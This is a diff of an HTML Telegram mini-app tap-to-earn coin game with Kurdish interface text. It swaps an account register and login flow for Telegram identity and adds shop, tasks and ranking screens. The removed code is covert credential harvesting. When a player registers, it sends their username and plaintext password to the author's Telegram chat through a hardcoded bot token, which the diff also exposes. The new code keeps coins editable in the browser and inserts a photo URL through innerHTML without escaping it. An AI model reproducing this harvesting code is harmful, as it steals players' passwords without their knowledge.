@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>FOX Coin Game - Telegram Bot Auth</title>
+    <title>FOX Coin Game - Pro Online</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         * {
@@ -18,7 +18,10 @@
         }
 
         body {
-            background-color: #0b0f19;
+            background-image: url('fox-bg.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
             color: #ffffff;
             display: flex;
             justify-content: center;
@@ -32,7 +35,8 @@
             max-width: 400px;
             height: 100%;
             max-height: 800px;
-            background-color: #0b0f19;
+            background-color: rgba(11, 15, 25, 0.92);
+            backdrop-filter: blur(4px);
             display: flex;
             flex-direction: column;
             justify-content: space-between;
@@ -40,6 +44,55 @@
             overflow: hidden;
             border: 2px solid rgba(212, 175, 55, 0.5);
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 15px;
+            gap: 8px;
+            z-index: 10;
+        }
+
+        .coin-balance {
+            background-color: rgba(20, 25, 35, 0.9);
+            border: 1px solid #d4af37;
+            border-radius: 12px;
+            padding: 6px 10px;
+            font-size: 13px;
+            color: #d4af37;
+            font-weight: bold;
+        }
+
+        .sound-toggle-btn {
+            background-color: rgba(20, 25, 35, 0.9);
+            border: 1px solid #d4af37;
+            border-radius: 12px;
+            padding: 6px 10px;
+            font-size: 13px;
+            color: #d4af37;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            font-weight: bold;
+            outline: none;
+        }
+
+        .user-level {
+            background-color: rgba(20, 25, 35, 0.9);
+            border: 1px solid #d4af37;
+            border-radius: 12px;
+            padding: 5px 10px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .user-level:active {
+            transform: scale(0.95);
         }
 
         .screen {
@@ -50,140 +103,42 @@
             padding: 15px;
             overflow-y: auto;
             width: 100%;
-            justify-content: center;
         }
 
-        .screen.active { display: flex; }
-
-        /* Auth Styles */
-        .auth-box {
-            background-color: rgba(18, 22, 33, 0.95);
-            border: 1.5px solid #d4af37;
-            border-radius: 16px;
-            width: 100%;
-            padding: 20px;
+        .screen.active {
             display: flex;
-            flex-direction: column;
-            gap: 12px;
-            box-shadow: 0 0 20px rgba(212, 175, 55, 0.2);
         }
 
-        .auth-box h2 {
-            color: #d4af37;
-            text-align: center;
-            font-size: 18px;
-            margin-bottom: 5px;
-        }
-
-        .auth-input {
-            width: 100%;
-            padding: 10px 12px;
-            border-radius: 8px;
-            border: 1px solid #2a3447;
-            background-color: rgba(11, 15, 25, 0.9);
-            color: #fff;
-            font-size: 13px;
-            text-align: right;
-            outline: none;
-        }
-
-        .auth-input:focus { border-color: #d4af37; }
-
-        .auth-btn {
-            background-color: #d4af37;
-            color: #0b0f19;
-            border: none;
-            border-radius: 8px;
-            padding: 10px;
-            font-size: 14px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            transition: 0.2s;
-        }
-
-        .auth-btn:active { transform: scale(0.98); }
-
-        .auth-switch {
-            text-align: center;
-            font-size: 12px;
-            color: #8b9bb4;
-            cursor: pointer;
-            margin-top: 5px;
-        }
-
-        .auth-switch span {
-            color: #d4af37;
-            text-decoration: underline;
-        }
-
-        /* Game UI */
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 12px;
-            gap: 6px;
-            z-index: 10;
-        }
-
-        .coin-balance {
-            background-color: rgba(20, 25, 35, 0.9);
-            border: 1px solid #d4af37;
-            border-radius: 12px;
-            padding: 5px 10px;
-            font-size: 13px;
-            color: #d4af37;
-            font-weight: bold;
-        }
-
-        .user-level {
-            background-color: rgba(20, 25, 35, 0.9);
-            border: 2px solid #ff4500;
-            border-radius: 12px;
-            padding: 4px 8px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
-        }
-
-        .lion-avatar-wrapper {
-            width: 28px;
-            height: 28px;
-            border-radius: 50%;
-            overflow: hidden;
-            border: 2px solid #fff;
-            background: #111;
-            display: flex;
+        .main-content {
             justify-content: center;
             align-items: center;
-        }
-
-        .main-game-area {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            flex-grow: 1;
-            width: 100%;
-            padding: 12px;
+            gap: 15px;
+            position: relative;
         }
 
         .big-coin-btn {
-            width: 150px;
-            height: 150px;
+            width: 187px;
+            height: 187px;
             border-radius: 50%;
-            background: radial-gradient(circle, #333 30%, #111 90%);
+            background: radial-gradient(circle, #222 30%, #000 90%);
             border: 4px solid #d4af37;
             display: flex;
             justify-content: center;
             align-items: center;
             cursor: pointer;
-            box-shadow: 0 0 25px rgba(212, 175, 55, 0.4);
+            box-shadow: 0 0 25px rgba(212, 175, 55, 0.5);
+            overflow: hidden;
             position: relative;
+            touch-action: manipulation;
+            flex-shrink: 0;
         }
 
-        .big-coin-btn span { font-size: 60px; pointer-events: none; }
+        .big-coin-btn img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            pointer-events: none;
+        }
 
         .floating-score {
             position: absolute;
@@ -192,11 +147,15 @@
             font-size: 13px;
             pointer-events: none;
             animation: floatUp 0.7s ease-out forwards;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.8);
             background: rgba(18, 22, 33, 0.9);
             border: 1.5px solid #d4af37;
             padding: 4px 10px;
             border-radius: 9px;
             z-index: 100;
+            direction: ltr;
+            white-space: nowrap;
+            box-shadow: 0 0 8px rgba(212, 175, 55, 0.4);
         }
 
         @keyframes floatUp {
@@ -205,22 +164,22 @@
         }
 
         .info-card {
-            background-color: rgba(18, 22, 33, 0.95);
+            background-color: rgba(18, 22, 33, 0.85);
             border: 1px solid #2a3447;
-            border-radius: 14px;
+            border-radius: 15px;
             width: 100%;
-            padding: 10px 12px;
+            padding: 12px;
             display: flex;
             flex-direction: column;
-            gap: 8px;
-            margin-top: 10px;
+            gap: 10px;
         }
 
         .info-row {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            font-size: 13px;
+            font-size: 14px;
+            direction: rtl;
         }
 
         .action-btn {
@@ -228,86 +187,48 @@
             color: white;
             border: none;
             border-radius: 10px;
-            padding: 8px;
-            font-size: 13px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-        }
-
-        .logout-btn {
-            background-color: #e74c3c;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 5px 10px;
-            font-size: 11px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-
-        /* Shop Border & Styles */
-        .shop-container {
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            width: 100%;
-            flex-grow: 1;
-            padding: 10px 0;
-            overflow-y: auto;
-        }
-
-        .shop-border-box {
-            background-color: rgba(18, 22, 33, 0.95);
-            border: 2px solid #d4af37;
-            border-radius: 14px;
-            padding: 14px;
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            box-shadow: 0 0 15px rgba(212, 175, 55, 0.15);
-        }
-
-        .shop-title {
-            color: #d4af37;
+            padding: 10px;
             font-size: 15px;
             font-weight: bold;
-            text-align: center;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 5px;
-        }
-
-        .shop-item-desc {
-            font-size: 12px;
-            color: #8b9bb4;
-            text-align: center;
-            line-height: 1.4;
-        }
-
-        .buy-btn {
-            background: linear-gradient(135deg, #d4af37, #aa8c2c);
-            color: #0b0f19;
-            border: none;
-            border-radius: 8px;
-            padding: 10px;
-            font-size: 13px;
-            font-weight: bold;
             cursor: pointer;
-            width: 100%;
-            transition: 0.2s;
+            text-align: center;
+            outline: none;
         }
 
-        .buy-btn:active { transform: scale(0.98); }
+        .action-btn:active { transform: scale(0.98); }
 
-        /* Navigation Bar */
+        .rank-item {
+            background-color: rgba(18, 22, 33, 0.9);
+            border: 1px solid #2a3447;
+            border-radius: 12px;
+            width: 100%;
+            padding: 10px 15px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        .rank-item.top-user { border: 1.5px solid #d4af37; background-color: rgba(212, 175, 55, 0.1); }
+
+        .rank-avatar {
+            width: 38px;
+            height: 38px;
+            border-radius: 50%;
+            overflow: hidden;
+            border: 1px solid #d4af37;
+            background: #222;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+        }
+
         .nav-bar {
             display: flex;
             justify-content: space-around;
             background-color: #121621;
             border-top: 1px solid #2a3447;
-            padding: 8px 0;
+            padding: 10px 0;
             z-index: 10;
         }
 
@@ -317,316 +238,481 @@
             align-items: center;
             color: #8b9bb4;
             font-size: 11px;
-            background: none;
-            border: none;
+            text-decoration: none;
+            gap: 4px;
             cursor: pointer;
             flex: 1;
+            outline: none;
+            background: none;
+            border: none;
         }
 
         .nav-item.active { color: #d4af37; }
         .nav-item span.icon { font-size: 16px; }
+
+        .section-box {
+            background-color: rgba(18, 22, 33, 0.95);
+            border: 1px solid #2a3447;
+            border-radius: 15px;
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
     </style>
 </head>
 <body>
 
+    <audio id="bgMusic" loop preload="auto">
+        <source src="abdulqahar_zakhoee.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        let isMusicPlaying = false;
+        function toggleMusic() {
+            let music = document.getElementById('bgMusic');
+            let btn = document.getElementById('soundToggleBtn');
+            if (isMusicPlaying) {
+                music.pause();
+                isMusicPlaying = false;
+                btn.innerHTML = '🔇 OFF';
+                btn.style.borderColor = '#d4af37';
+                btn.style.color = '#d4af37';
+            } else {
+                music.play().then(() => {
+                    isMusicPlaying = true;
+                    btn.innerHTML = '🎵 ON';
+                    btn.style.borderColor = '#2ecc71';
+                    btn.style.color = '#2ecc71';
+                }).catch(e => console.log("Audio play blocked:", e));
+            }
+        }
+    </script>
+
     <div class="game-container">
-
-        <!-- 1. REGISTER SCREEN -->
-        <div id="registerScreen" class="screen active">
-            <div class="auth-box">
-                <h2>👤 تۆمارکرنا ئەکاونتی (Register)</h2>
-                <input type="text" id="regUsername" class="auth-input" placeholder="ناڤێ بەکارهێنەری یان یمێل (Username/Email)">
-                <div style="display: flex; gap: 5px;">
-                    <input type="text" id="regPassword" class="auth-input" placeholder="پاسوورد (Password)">
-                    <button type="button" onclick="generateRandomPassword()" style="background: #3498db; border: none; color: #fff; border-radius: 8px; padding: 0 10px; font-size: 11px; cursor: pointer; white-space: nowrap;">Random 🎲</button>
+        <!-- Header -->
+        <div class="header">
+            <div class="coin-balance">
+                🟡 <span id="score">0.00000</span>
+            </div>
+            <button class="sound-toggle-btn" id="soundToggleBtn" onclick="toggleMusic()">
+                🔇 OFF
+            </button>
+            <div class="user-level" id="profileHeaderBtn" onclick="openProfileSettings()">
+                <div style="text-align: right;">
+                    <div style="font-size: 11px; font-weight: bold;" id="userNameText">FOX Player</div>
+                    <div style="font-size: 9px; color: #d4af37;" id="levelText">Lvl 1</div>
                 </div>
-                <button class="auth-btn" onclick="registerUser()">تۆمارکرن (Sign Up)</button>
-                <div class="auth-switch" onclick="switchAuthScreen('loginScreen')">تە پێشتر ئەکاونت هەیە؟ <span>چوونە ژوورڤە (Login)</span></div>
+                <div id="userAvatarHeader" style="width: 28px; height: 28px; border-radius: 50%; overflow: hidden; border: 1px solid #d4af37; background: #222; display: flex; justify-content: center; align-items: center;">
+                    <span id="fallbackAvatarHeader" style="font-size: 14px;">⚽</span>
+                </div>
             </div>
         </div>
 
-        <!-- 2. LOGIN SCREEN -->
-        <div id="loginScreen" class="screen">
-            <div class="auth-box">
-                <h2>🔐 چوونە ژوورڤە (Login)</h2>
-                <input type="text" id="loginUsername" class="auth-input" placeholder="ناڤێ بەکارهێنەری (Username/Email)">
-                <input type="password" id="loginPassword" class="auth-input" placeholder="پاسوورد (Password)">
-                <button class="auth-btn" onclick="loginUser()">چوونە ژوورڤە (Sign In)</button>
-                <div class="auth-switch" onclick="switchAuthScreen('registerScreen')">تە ئەکاونت نینە؟ <span>تۆمارکرنا نوو (Register)</span></div>
+        <!-- 1. Tap Screen -->
+        <div id="tapScreen" class="screen main-content active">
+            <div class="big-coin-btn" id="tapBtn">
+                <img src="coin.jpg" alt="FOX Coin">
+            </div>
+
+            <div class="info-card">
+                <div class="info-row">
+                    <span>پەکێت 📦</span>
+                    <span id="packetText" style="font-weight: bold; direction: ltr;">4 / 5</span>
+                </div>
+                <div class="info-row" style="color: #8b9bb4; font-size: 12px;">
+                    <span>پەکیتا داهاتی</span>
+                    <span id="timerText" style="direction: ltr;">02:00:00</span>
+                </div>
+                <hr style="border: 0; border-top: 1px solid #2a3447;">
+                <div class="info-row">
+                    <span>ئینرجی ⚡</span>
+                    <span style="font-weight: bold; direction: ltr;" id="energyText">500 / 500</span>
+                </div>
+                <button class="action-btn" id="useEnergyBtn" onclick="usePacket()">بکاربینە (Use) ⚡</button>
             </div>
         </div>
 
-        <!-- 3. MAIN GAME SCREEN (TAP) -->
-        <div id="gameScreen" class="screen" style="padding: 0; justify-content: space-between;">
-            <!-- Header -->
-            <div class="header" style="width: 100%;">
-                <div class="coin-balance">
-                    🟡 <span id="score">0.00000</span>
-                </div>
-                <button class="logout-btn" onclick="logoutUser()">دەرکەڤت (Logout)</button>
-                <div class="user-level" id="profileHeaderBtn">
-                    <div style="text-align: right;">
-                        <div style="font-size: 10px; font-weight: bold; color: #ffae42;" id="userNameText">FOX Player</div>
-                        <div style="font-size: 8px; color: #d4af37;" id="levelText">Lvl 1 🦁</div>
-                    </div>
-                    <div class="lion-avatar-wrapper">
-                        <span style="font-size: 12px;">🦁</span>
-                    </div>
-                </div>
+        <!-- 2. Shop & Boosters Screen -->
+        <div id="shopScreen" class="screen" style="align-items: center; justify-content: flex-start; gap: 12px;">
+            <h3 style="color: #d4af37;">🛒 دووکانێ و بۆوێستەر</h3>
+
+            <div style="background: linear-gradient(135deg, rgba(212, 175, 55, 0.2) 0%, rgba(18, 22, 33, 0.95) 100%); border: 2px solid #d4af37; border-radius: 15px; width: 100%; padding: 15px; display: flex; flex-direction: column; align-items: center; gap: 8px;">
+                <h4 style="font-size: 15px; color: #d4af37;">پەکەتا پرێمیوم (2x Tap)</h4>
+                <p style="font-size: 11px; color: #b0c4de; text-align: center;">تەپ تەپای تە دکەتە دوو هێندە!</p>
+                <p style="font-size: 12px; color: #d4af37; font-weight: bold;">بهایێ: 1.00 FOX 🟡</p>
+                <button id="buyPremiumBtn" onclick="buyPremium()" style="background-color: #f39c12; color: white; border: none; border-radius: 8px; padding: 8px 15px; font-size: 13px; font-weight: bold; cursor: pointer; width: 100%;">کڕین ✨</button>
             </div>
 
-            <!-- Content Area -->
-            <div id="tabContentArea" style="display: flex; flex-direction: column; align-items: center; justify-content: center; flex-grow: 1; width: 100%; padding: 12px; overflow-y: auto;">
-                
-                <!-- TAP TAB -->
-                <div id="tapTabContent" class="main-game-area" style="width: 100%;">
-                    <div class="big-coin-btn" id="tapBtn">
-                        <span>🪙</span>
-                    </div>
-
-                    <div class="info-card">
-                        <div class="info-row">
-                            <span>ئینرجی ⚡</span>
-                            <span style="font-weight: bold;" id="energyText">1000 / 1000</span>
-                        </div>
-                        <button class="action-btn" onclick="useEnergy()">پڕکرنا ئینرجی (Refill) ⚡</button>
-                    </div>
-                </div>
-
-                <!-- SHOP TAB -->
-                <div id="shopTabContent" class="shop-container" style="display: none;">
-                    <div class="shop-border-box">
-                        <div class="shop-title">🛒 فۆرمەکا زێدەکرنا کەناڵ / گروپ</div>
-                        <div class="shop-item-desc">لینکێ کەناڵ یان گروپێ خۆ ل خوارێ بنڤیسە و تۆمار بکە (نرخ: 100 Coin)</div>
-                        <input type="text" id="userChannelLink" class="auth-input" placeholder="https://t.me/your_channel">
-                        <button class="buy-btn" onclick="buyAndSaveChannel()">تۆمارکرن و کڕین (ب 100 Coin) 🟡</button>
-                    </div>
-
-                    <div class="shop-border-box" style="background: rgba(20, 25, 35, 0.8);">
-                        <div class="shop-title" style="font-size: 13px; color: #fff;">🔗 لینکێ هاتیە سەیڤکرن:</div>
-                        <div id="savedLinkDisplay" style="font-size: 12px; color: #2ecc71; text-align: center; word-break: break-all;">هێشتا چ لینک نینە</div>
-                    </div>
-                </div>
-
+            <div class="section-box">
+                <h4 style="font-size: 14px; color: #fff;">بەرزکرنا ئاستێ کلیکی (Multitap)</h4>
+                <p style="font-size: 11px; color: #8b9bb4;">ئاستی هەنووکەیی: <span id="multitapLevelText">1</span> (+0.00001)</p>
+                <button onclick="upgradeMultitap()" style="background-color: #3498db; color: white; border: none; border-radius: 8px; padding: 8px; font-size: 12px; font-weight: bold; cursor: pointer;">بهایێ بەرزکرنێ: 0.50 FOX 🟡</button>
             </div>
 
-            <!-- Navigation Bar -->
-            <div class="nav-bar" style="width: 100%;">
-                <button class="nav-item active" onclick="switchTab('tap', this)">
-                    <span class="icon">👆</span>
-                    <span>Tap</span>
-                </button>
-                <button class="nav-item" onclick="switchTab('shop', this)">
-                    <span class="icon">🛒</span>
-                    <span>Shop</span>
-                </button>
+            <div class="section-box">
+                <h4 style="font-size: 14px; color: #fff;">100 مێمبەر بۆ کەناڵی</h4>
+                <p style="font-size: 11px; color: #d4af37; font-weight: bold;">بهایێ: 1.00 FOX 🟡</p>
+                <input type="text" id="channelLinkInput" placeholder="لینکێ کەناڵی لێرە بنڤیسە..." style="width: 100%; padding: 8px; border-radius: 6px; border: 1px solid #d4af37; background-color: rgba(11, 15, 25, 0.9); color: #fff; font-size: 12px; text-align: right; outline: none;">
+                <button onclick="buyMembers()" style="background-color: #2ecc71; color: white; border: none; border-radius: 8px; padding: 8px; font-size: 12px; font-weight: bold; cursor: pointer;">کڕین 🚀</button>
             </div>
         </div>
 
+        <!-- 3. Tasks & Daily Streak Screen -->
+        <div id="tasksScreen" class="screen" style="align-items: center; justify-content: flex-start; gap: 12px;">
+            <h3 style="color: #d4af37;">📋 ئەرک و ڕۆژژمێرا ڕۆژانە</h3>
+
+            <div class="section-box" style="border: 1.5px solid #d4af37;">
+                <h4 style="font-size: 14px; color: #d4af37;">📅 پاداشتێ سەردانا ڕۆژانە (Streak)</h4>
+                <p style="font-size: 11px; color: #b0c4de;" id="streakStatusText">ڕۆژی هەنووکەیی: ڕۆژی 1</p>
+                <button id="claimStreakBtn" onclick="claimDailyStreak()" style="background-color: #e67e22; color: white; border: none; border-radius: 8px; padding: 8px; font-size: 12px; font-weight: bold; cursor: pointer;">وەرگرتنا پاداشتێ ڕۆژانە 🎁</button>
+            </div>
+
+            <div class="section-box">
+                <h4 style="font-size: 14px; color: #fff;">👥 بانگهێشتکرنا هاوڕێیان (Referral)</h4>
+                <p style="font-size: 11px; color: #8b9bb4;">هەر هاوڕێیەک بێنە، 0.50 کۆین وەربگرە!</p>
+                <button onclick="copyRefLink()" style="background-color: #9b59b6; color: white; border: none; border-radius: 8px; padding: 8px; font-size: 12px; font-weight: bold; cursor: pointer;">کۆپیکرنا لینکێ بانگهێشتێ 🔗</button>
+            </div>
+        </div>
+
+        <!-- 4. Ranking Screen -->
+        <div id="rankingScreen" class="screen">
+            <h3 style="margin-bottom: 12px; color: #d4af37;">🏆 ڕێزبەندییا یاریزانان (گشتی)</h3>
+            <div id="rankingListContainer" style="width: 100%; display: flex; flex-direction: column; gap: 5px;">
+                <p style="text-align: center; color: #8b9bb4; font-size: 13px; margin-top: 20px;">داتایێن ڕێزبەندیێ بار دبن...</p>
+            </div>
+        </div>
+
+        <!-- Navigation Bar -->
+        <div class="nav-bar" id="navBar">
+            <button onclick="switchTab('rankingScreen', event)" class="nav-item" id="navRanking">
+                <span class="icon">🏆</span>
+                <span>Rank</span>
+            </button>
+            <button onclick="switchTab('tasksScreen', event)" class="nav-item" id="navTasks">
+                <span class="icon">📋</span>
+                <span>Tasks</span>
+            </button>
+            <button onclick="switchTab('shopScreen', event)" class="nav-item" id="navShop">
+                <span class="icon">🛒</span>
+                <span>Shop</span>
+            </button>
+            <button onclick="switchTab('tapScreen', event)" class="nav-item active" id="navTap">
+                <span class="icon">👆</span>
+                <span>Tap</span>
+            </button>
+        </div>
     </div>
 
     <script>
+        window.Telegram.WebApp.ready();
         const tg = window.Telegram.WebApp;
         tg.expand();
 
-        // زانیاریێن بۆتا تێلێگرامێ تە (Token & Chat ID)
-        const BOT_TOKEN = "8945123640:AAGjazTZFPNmjHDAw5LdwYTB9tWjQFVooXs";
-        const CHAT_ID = "8920889734";
-
-        let currentUserKey = null;
-        let coins = 0.0;
-        let energy = 1000;
-        let maxEnergy = 1000;
-        let level = 1;
-        let myLink = "";
-
-        window.onload = function() {
-            let activeUser = sessionStorage.getItem('fox_active_user');
-            if (activeUser) {
-                loadUserData(activeUser);
-                showGameScreen();
-            }
-        };
-
-        function switchAuthScreen(screenId) {
-            document.getElementById('registerScreen').classList.remove('active');
-            document.getElementById('loginScreen').classList.remove('active');
-            document.getElementById(screenId).classList.add('active');
-        }
-
-        function generateRandomPassword() {
-            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$";
-            let pass = "";
-            for (let i = 0; i < 8; i++) {
-                pass += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            document.getElementById('regPassword').value = pass;
-            alert("پاسووردا Random بۆ تە هاتە دروستکرن: " + pass + "\nتکایە لای خۆ سەیڤ بکە!");
-        }
-
-        // رێکا هنارتنا نامەی بۆ تێلێگراما تە
-        function sendTelegramNotification(username, password) {
-            const message = `🚨 ئەکاونتەکێ نوو هاتە دروستکرن!\n\n👤 ناڤ/یمێل: ${username}\n🔑 پاسوورد: ${password}`;
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
-
-            fetch(url)
-                .then(response => response.json())
-                .then(data => {
-                    console.log("Telegram notification sent:", data);
-                })
-                .catch(error => {
-                    console.error("Error sending notification:", error);
-                });
-        }
-
-        function registerUser() {
-            let username = document.getElementById('regUsername').value.trim();
-            let password = document.getElementById('regPassword').value.trim();
-
-            if (!username || !password) {
-                alert('تکایە ناڤ/یمێل و پاسووردی بنڤیسە! ❌');
-                return;
-            }
-
-            let usersDB = JSON.parse(localStorage.getItem('fox_users_database') || '{}');
-
-            if (usersDB[username]) {
-                alert('ئەڤ ناڤە پێشتر هاتیە تۆمارکرن! تکایە ناڤەکێ دی هەلبژێرە. ❌');
-                return;
-            }
-
-            usersDB[username] = {
-                password: password,
-                coins: 150.0,
-                energy: 1000,
-                maxEnergy: 1000,
-                level: 1,
-                channelLink: ""
-            };
-
-            localStorage.setItem('fox_users_database', JSON.stringify(usersDB));
-
-            // هنارتنا نامەی بۆ تێلێگراما تە دەمێ ئەکاونت دروست دبت
-            sendTelegramNotification(username, password);
-
-            alert('پیرۆزە! ئەکاونتا تە ب سەرکەڤتن هاتە دروستکرن. نوو دەرباز بە (Login). 🎉');
-            switchAuthScreen('loginScreen');
-        }
-
-        function loginUser() {
-            let username = document.getElementById('loginUsername').value.trim();
-            let password = document.getElementById('loginPassword').value.trim();
-
-            let usersDB = JSON.parse(localStorage.getItem('fox_users_database') || '{}');
-
-            if (!usersDB[username] || usersDB[username].password !== password) {
-                alert('ناڤێ بەکارهێنەری یان پاسوورد خەلەتە! ❌');
-                return;
-            }
-
-            sessionStorage.setItem('fox_active_user', username);
-            loadUserData(username);
-            showGameScreen();
-        }
-
-        function loadUserData(username) {
-            currentUserKey = 'fox_user_data_' + username;
-            let usersDB = JSON.parse(localStorage.getItem('fox_users_database') || '{}');
-            let uData = usersDB[username] || {};
-
-            coins = parseFloat(uData.coins || 0.0);
-            energy = parseInt(uData.energy || 1000);
-            maxEnergy = parseInt(uData.maxEnergy || 1000);
-            level = parseInt(uData.level || 1);
-            myLink = uData.channelLink || "";
-
-            document.getElementById('userNameText').innerText = username;
-            document.getElementById('score').innerText = coins.toFixed(5);
-            document.getElementById('energyText').innerText = energy + " / " + maxEnergy;
-            document.getElementById('levelText').innerText = "Lvl " + level + " 🦁";
-            
-            if (myLink) {
-                document.getElementById('userChannelLink').value = myLink;
-                document.getElementById('savedLinkDisplay').innerText = myLink;
-            } else {
-                document.getElementById('savedLinkDisplay').innerText = "هێشتا چ لینک نینە";
-            }
-        }
-
-        function saveCurrentUserData() {
-            let username = sessionStorage.getItem('fox_active_user');
-            if (!username) return;
-            let usersDB = JSON.parse(localStorage.getItem('fox_users_database') || '{}');
-            
-            if (usersDB[username]) {
-                usersDB[username].coins = coins;
-                usersDB[username].energy = energy;
-                usersDB[username].maxEnergy = maxEnergy;
-                usersDB[username].level = level;
-                usersDB[username].channelLink = myLink;
-                localStorage.setItem('fox_users_database', JSON.stringify(usersDB));
-            }
-        }
-
-        function showGameScreen() {
-            document.getElementById('registerScreen').classList.remove('active');
-            document.getElementById('loginScreen').classList.remove('active');
-            document.getElementById('gameScreen').classList.add('active');
-        }
-
-        function logoutUser() {
-            saveCurrentUserData();
-            sessionStorage.removeItem('fox_active_user');
-            currentUserKey = null;
-            document.getElementById('gameScreen').classList.remove('active');
-            document.getElementById('loginScreen').classList.add('active');
-        }
-
-        function switchTab(tabName, btnElement) {
-            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
-            btnElement.classList.add('active');
-
-            if (tabName === 'tap') {
-                document.getElementById('tapTabContent').style.display = 'flex';
-                document.getElementById('shopTabContent').style.display = 'none';
-            } else if (tabName === 'shop') {
-                document.getElementById('tapTabContent').style.display = 'none';
-                document.getElementById('shopTabContent').style.display = 'flex';
-            }
-        }
-
-        function buyAndSaveChannel() {
-            let linkInput = document.getElementById('userChannelLink').value.trim();
-            if (!linkInput) {
-                alert('تکایە لینکەکێ بنڤیسە! ❌');
-                return;
-            }
-
-            if (coins < 100) {
-                alert('کۆینێن تە کێمەن! پێدڤی بە 100 Coin تە هەبن. 🟡❌');
-                return;
-            }
-
-            coins -= 100;
-            myLink = linkInput;
-
-            document.getElementById('score').innerText = coins.toFixed(5);
-            document.getElementById('savedLinkDisplay').innerText = myLink;
-            saveCurrentUserData();
-
-            alert('پیرۆزە! لینکێ تە ب سەرکەڤتن هاتە سەیڤکرن و 100 Coin ژ تە هاتە برن. 🎉');
-        }
-
-        const tapBtn = document.getElementById('tapBtn');
+        let telegramUser = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user : null;
         
+        let telegramUserId = telegramUser && telegramUser.id ? telegramUser.id.toString() : 'user_' + Math.floor(Math.random() * 1000000);
+        let defaultTelegramName = telegramUser && telegramUser.first_name ? telegramUser.first_name : 'FOX Player';
+        let telegramPhotoUrl = telegramUser && telegramUser.photo_url ? telegramUser.photo_url : null;
+
+        // کلیلا تایبەت بە هەر یاریزانەکی دا کو کۆینێن وان تێکەل نەبن
+        const REAL_PREFIX = 'fox_pro_secure_storage_' + telegramUserId + '_';
+
+        let telegramName = localStorage.getItem(REAL_PREFIX + 'custom_name') || defaultTelegramName;
+
+        document.getElementById('userNameText').innerText = telegramName;
+        if (telegramPhotoUrl) {
+            document.getElementById('userAvatarHeader').innerHTML = `<img src="${telegramPhotoUrl}" alt="Profile" style="width: 100%; height: 100%; object-fit: cover;">`;
+        }
+
+        function openProfileSettings() {
+            let currentName = document.getElementById('userNameText').innerText;
+            let newName = prompt(`تایبەتمەندییا پروفایلی:\n\n🆔 Telegram ID: ${telegramUserId}\n\nتکایە ناڤێ خۆ یێ نوێ ل خوارێ بنڤیسە:`, currentName);
+            
+            if (newName !== null && newName.trim() !== "") {
+                telegramName = newName.trim();
+                document.getElementById('userNameText').innerText = telegramName;
+                localStorage.setItem(REAL_PREFIX + 'custom_name', telegramName);
+                
+                syncUserToGlobalStorage();
+                alert(`پیرۆزە! ناڤێ تە هاتە گۆڕین بۆ: ${telegramName}`);
+                updateOnlineRanking();
+            }
+        }
+
+        let isFirstTimeUser = localStorage.getItem(REAL_PREFIX + 'first_welcome_done');
+        let coins = parseFloat(localStorage.getItem(REAL_PREFIX + 'coins'));
+        
+        if (isFirstTimeUser === null) {
+            coins = 1.00000;
+            localStorage.setItem(REAL_PREFIX + 'coins', coins);
+            localStorage.setItem(REAL_PREFIX + 'first_welcome_done', 'true');
+        } else if (isNaN(coins)) {
+            coins = 0.00000;
+        }
+
+        let energy = localStorage.getItem(REAL_PREFIX + 'energy') !== null ? parseInt(localStorage.getItem(REAL_PREFIX + 'energy')) : 500;
+        let maxEnergy = parseInt(localStorage.getItem(REAL_PREFIX + 'max_energy')) || 500;
+        let level = parseInt(localStorage.getItem(REAL_PREFIX + 'level')) || 1;
+        let totalTaps = parseInt(localStorage.getItem(REAL_PREFIX + 'total_taps')) || 0;
+        let packets = localStorage.getItem(REAL_PREFIX + 'packets') !== null ? parseInt(localStorage.getItem(REAL_PREFIX + 'packets')) : 4;
+        let totalSeconds = localStorage.getItem(REAL_PREFIX + 'timer') ? parseInt(localStorage.getItem(REAL_PREFIX + 'timer')) : (2 * 3600);
+        let isTimerRunning = false;
+        
+        let isPremium = localStorage.getItem(REAL_PREFIX + 'is_premium') === 'true';
+        let multitapLevel = parseInt(localStorage.getItem(REAL_PREFIX + 'multitap_level')) || 1;
+
+        let lastStreakDate = localStorage.getItem(REAL_PREFIX + 'last_streak_date') || '';
+        let streakDay = parseInt(localStorage.getItem(REAL_PREFIX + 'streak_day')) || 1;
+
+        const scoreElement = document.getElementById('score');
+        const levelText = document.getElementById('levelText');
+        const tapBtn = document.getElementById('tapBtn');
+        const energyText = document.getElementById('energyText');
+        const timerText = document.getElementById('timerText');
